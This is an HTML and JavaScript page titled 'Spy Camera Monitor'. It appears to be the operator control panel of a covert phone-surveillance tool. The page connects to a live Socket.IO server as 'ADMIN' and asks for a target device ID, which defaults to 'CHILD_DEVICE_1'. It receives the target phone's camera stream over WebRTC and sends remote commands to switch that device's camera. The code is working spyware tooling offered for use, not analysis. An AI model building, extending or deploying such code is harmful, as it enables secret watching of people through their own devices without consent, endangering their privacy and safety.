<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Camera Monitor</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
    <style>
        /* --- PHONE STYLE UI --- */
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: white;
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        /* Phone Frame */
        .phone-frame {
            position: relative;
            width: 100%;
            height: 100%;
            max-width: 480px; /* Mobile width limit */
            max-height: 850px;
            background: #000;
            overflow: hidden;
            border-radius: 0px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }

        @media (min-width: 500px) {
            .phone-frame {
                border-radius: 30px;
                border: 8px solid #333;
                height: 90vh;
            }
        }

        /* Video Screen */
        video {
            width: 100%;
            height: 100%;
            object-fit: cover; /* Full screen fill */
            background: #111;
            transform: scaleX(-1); /* Mirror effect (optional) */
        }

        /* Top Bar (Status) */
        .top-bar {
            position: absolute;
            top: 20px;
            left: 0;
            width: 100%;
            text-align: center;
            z-index: 10;
            background: linear-gradient(to bottom, rgba(0,0,0,0.6), transparent);
            padding-bottom: 20px;
        }

        .status-badge {
            background: rgba(255, 0, 0, 0.7);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .status-badge.online {
            background: rgba(0, 255, 0, 0.7);
            color: black;
        }

        /* Bottom Controls */
        .controls {
            position: absolute;
            bottom: 30px;
            width: 100%;
            display: flex;
            justify-content: space-around;
            align-items: center;
            z-index: 10;
            padding-bottom: 10px;
        }

        /* Switch Cam Button */
        .btn-switch {
            width: 50px;
            height: 50px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
        }
        .btn-switch:active { transform: scale(0.9); background: rgba(255, 255, 255, 0.4); }
        
        .icon-switch {
            width: 24px;
            height: 24px;
            border: 2px solid white;
            border-radius: 5px;
            position: relative;
        }
        .icon-switch::after {
            content: 'â†º';
            position: absolute;
            top: -6px;
            left: 4px;
            font-size: 20px;
            color: white;
            font-weight: bold;
        }

        /* Device Input Overlay (Start Screen) */
        #login-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 20;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        input {
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #444;
            background: #222;
            color: white;
            text-align: center;
            margin-bottom: 10px;
            font-size: 16px;
        }

        button.start-btn {
            padding: 10px 20px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

    </style>
</head>
<body>

    <div class="phone-frame">
        
        <div id="login-overlay">
            <h3>Spy Monitor</h3>
            <p style="color: #aaa; font-size: 12px; margin-bottom: 20px;">Enter Target Device ID</p>
            <input type="text" id="targetId" value="CHILD_DEVICE_1" placeholder="Enter Device ID">
            <button class="start-btn" onclick="startMonitor()">CONNECT</button>
        </div>

        <div class="top-bar">
            <span id="status" class="status-badge">Waiting...</span>
        </div>

        <video id="remoteVideo" autoplay playsinline muted></video>

        <div class="controls">
            <div style="width: 40px; height: 40px; background: #333; border-radius: 5px;"></div>

            <div style="width: 70px; height: 70px; border: 4px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
                <div style="width: 60px; height: 60px; background: red; border-radius: 50%;"></div>
            </div>

            <button class="btn-switch" onclick="switchCamera()">
                <div class="icon-switch"></div>
            </button>
        </div>
    </div>

    <script>
        // âœ… SERVER CONFIGURATION
        const SOCKET_URL = "https://child-v9no.onrender.com"; 
        
        let socket;
        let peerConnection;
        let targetDeviceId = "CHILD_DEVICE_1";
        
        // Google STUN Server (Connectivity ke liye)
        const config = {
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' }
            ]
        };

        function startMonitor() {
            targetDeviceId = document.getElementById("targetId").value.trim();
            document.getElementById("login-overlay").style.display = 'none';
            initSocket();
        }

        function initSocket() {
            socket = io(SOCKET_URL);

            socket.on("connect", () => {
                console.log("âœ… Connected to Server");
                updateStatus("Connected", true);
                
                // Hum 'ADMIN' ban kar join karenge
                socket.emit("join-room", "ADMIN");
            });

            // 1. OFFER AAYA (Phone se)
            socket.on("offer", async (data) => {
                console.log("ðŸ“¡ Offer Received");
                updateStatus("Live Stream", true);
                
                // Peer Connection Banao
                createPeerConnection();

                // Remote Description Set Karo
                await peerConnection.setRemoteDescription(new RTCSessionDescription({
                    type: "offer",
                    sdp: data.sdp
                }));

                // Answer Create Karo
                const answer = await peerConnection.createAnswer();
                await peerConnection.setLocalDescription(answer);

                // Answer Wapas Bhejo (Target: Device ID)
                socket.emit("answer", {
                    target: targetDeviceId, // "CHILD_DEVICE_1"
                    type: "answer",
                    sdp: answer.sdp
                });
            });

            // 2. ICE CANDIDATE (Path dhundne ke liye)
            socket.on("candidate", async (data) => {
                if (peerConnection) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate({
                            candidate: data.candidate,
                            sdpMid: data.sdpMid,
                            sdpMLineIndex: data.sdpMLineIndex
                        }));
                    } catch (e) {
                        console.error("Error adding candidate", e);
                    }
                }
            });
        }

        function createPeerConnection() {
            if (peerConnection) peerConnection.close();
            
            peerConnection = new RTCPeerConnection(config);

            // Jab Video Stream aaye
            peerConnection.ontrack = (event) => {
                const video = document.getElementById("remoteVideo");
                video.srcObject = event.streams[0];
            };

            // Jab ICE Candidate mile (Server ko bhejo)
            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit("candidate", {
                        target: targetDeviceId,
                        type: "candidate",
                        candidate: event.candidate.candidate,
                        sdpMid: event.candidate.sdpMid,
                        sdpMLineIndex: event.candidate.sdpMLineIndex
                    });
                }
            };
        }

        // ðŸ”„ SWITCH CAMERA FUNCTION
        function switchCamera() {
            console.log("ðŸ”„ Sending Switch Camera Command...");
            if(socket) {
                // Server ko bolo ki target device ka camera badle
                socket.emit("switch-camera", { target: targetDeviceId });
                
                // Visual feedback
                const btn = document.querySelector('.btn-switch');
                btn.style.transform = "rotate(180deg)";
                setTimeout(() => btn.style.transform = "rotate(0deg)", 300);
            }
        }

        function updateStatus(text, isOnline) {
            const el = document.getElementById("status");
            el.innerText = text;
            if(isOnline) {
                el.classList.add("online");
                el.style.backgroundColor = "rgba(0, 255, 0, 0.7)";
                el.style.color = "black";
            } else {
                el.style.backgroundColor = "rgba(255, 0, 0, 0.7)";
            }
        }
    </script>

</body>
</html>
